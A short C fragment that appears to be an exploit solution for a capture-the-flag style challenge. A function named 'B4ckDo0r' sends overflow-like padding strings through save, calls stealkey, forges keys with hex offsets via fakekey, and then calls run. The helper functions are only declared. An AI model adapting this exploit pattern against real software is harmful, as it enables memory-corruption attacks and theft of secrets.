void save(char *, char *);
void takeaway();
void stealkey();
void fakekey(int);
void run();

void B4ckDo0r() {
    save("aaaaaaaa", "bbbbbbbbccccccccccccccccccccccccccccccccccccccccccccccccccccccccc");
    save("", "bbbbbbbbccccccccccccccccccccccccccccccccccccccccccccccccccccccccc");
    stealkey();
    fakekey(-0x1ecbf0);
    fakekey(0xe3b04);
    run();
}
